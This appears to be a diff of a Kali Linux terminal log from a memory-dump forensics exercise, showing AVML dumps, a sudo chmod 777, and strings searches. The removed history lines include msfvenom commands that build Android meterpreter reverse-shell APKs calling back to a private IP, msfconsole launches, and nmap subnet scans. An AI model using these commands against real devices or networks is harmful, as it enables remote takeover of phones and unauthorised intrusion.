@@ -128,24 +128,36 @@ strings: caine.mem: Permission denied
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ls               
 avml  caine0.mem  caine.mem
+
+┌──(kali㉿kali)-[~]
+└─$ ls -l ~/caine0.mem
+
+-rw------- 1 root root 2146951262 Oct 27 03:33 /home/kali/caine0.mem
+                                                                        
+┌──(kali㉿kali)-[~]
+└─$ chmod 777 caine0.mem
+
+chmod: changing permissions of 'caine0.mem': Operation not permitted
+                                                                        
+┌──(kali㉿kali)-[~]
+└─$ sudo chmod 777 caine0.mem
+
+                                                                        
+┌──(kali㉿kali)-[~]
+└─$ ls -l ~/caine0.mem     
+
+-rwxrwxrwx 1 root root 2146951262 Oct 27 03:33 /home/kali/caine0.mem
+
+==================================================================================
+==================================================================================
+==================================================================================
+==================================================================================
+==================================================================================
+
                                                                         
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ history 
-    1  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.164 LPORT=8484 > test22.apk
-    2  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=8080 > test22.apk
-    3  msfconsole
-    4  ip a
-    5  firefox www.whatsapp.com
-    6  ip a
-    7  ping 192.168.176.153
-    8  nmap -Pn -vv -o 192.168.176.164/24
-    9  nmap -Pn -vv  192.168.176.164/24
-   10  msfconsole
-   11  ip a
-   12  msfconsole
-   13  history
-   14  ls
-   15  clear
+ 
    16  ls
    17  cd Download 
    18  cd Downloads
@@ -169,10 +181,18 @@ avml  caine0.mem  caine.mem
    36  strings caine.mem | grep -i vanderlay
    37  sudo strings caine.mem | grep -i vanderlay
    38  ls
-                                                                        
+
+==================================================================================
+==================================================================================
+==================================================================================
+
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ 
 
+  62  ls -l ~/caine0.mem\n
+   63  chmod 777 caine0.mem\n
+   64  sudo chmod 777 caine0.mem\n
+   65  ls -l ~/caine0.mem\n
 
 
 
